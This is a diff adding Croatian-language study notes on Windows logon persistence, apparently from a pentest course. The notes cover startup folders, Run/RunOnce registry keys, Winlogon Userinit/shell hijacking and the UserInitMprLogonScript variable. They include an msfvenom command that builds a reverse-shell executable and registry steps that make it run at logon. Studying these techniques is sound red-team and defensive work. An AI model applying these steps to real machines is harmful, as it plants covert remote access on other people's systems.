@@ -1,0 +1,50 @@
+Startup folder
+Svaki korisnik ima direktoriji koji sadrzi njihove startup datoteke na putanji:
+C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+No ako zelimo da svaki korisnik kada se ulogira pokrene neki program koristimo:
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+Kako bi to iskoristili za svaki racun generiramo .exe datoteku koju cemo stavili na putanju C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+Run/RunOnce
+Također mozemo napraviti da korisnik pokrene program pri logiranju preko registrija.
+Navedene putanje u registriju sadrze specifikacije koje programe pokrenuti pri logona:
+
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run (Trenutni korisnik)
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce (Trenutni korisnik)
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+Run znaci da ce se pokrenuti svaki put pri logonu, a runOnce znaci samo jednom i tjt.
+Na nasem racunualu kreiramo exploit preko msfvenom:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o ime.exe
+
+Sada ulazimo u HKLM\Software\Microsoft\Windows\CurrentVersion\Run i radimo sljedece:
+Kreiramo novi REG_EXPAND_SZ (type) i dajemo mu bilo koje ime.
+A za polje data stavljamo putanju naseg paketa. (postaviti putanju exploita u C:\Windows\exploit.exe)
+
+Winlogon
+Moguca alternativa za ucitavanje exploita je koristenje Winlogon servisa.
+On radi tako da učita korisniciki profil nakon autentifikacije.
+Neki registry kljucevi se nalaze na putanji:
+
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+
+Userinit pokazuje na userinit.exe koji učitava korisnicke preferencije
+shell pokazuje na sistemski shell, a to je explorer.exe
+
+Kako bi exploitali to trebamo kreirati exploit preko msfvenom kao i prije.
+Modificiramo Userinit ili shell i appendamo na kraj sa zarezom putanju naseg exploita da se pokrene.
+
+Logon Scripts
+Ovaj se exploit nadovezuje na prijašnju userinit.exe datoteku.
+Pri učitavanju korisnickog profila on trazi varijablu naziva `UserInitMprLogonScript`
+Mozemo iskorisiti tu varijablu kako bi ucitalo nas exploit.
+Varijabla `UserInitMprLogonScript` ne postoji po defaultu tako da cemo ju morati dodati u HKCU\Enviroment
+Dodajemo sljedece:
+
+HKCU\ENVIROMENT, dodajemo varijablu tipa REG_EXPAND_SZ naziva UserInitMprLogonScript i pod data polje data putanju do naseg exploita.
+
+(Zato sto se koristi HKCU exploit vrijedi samo za trenutnog korisnika)
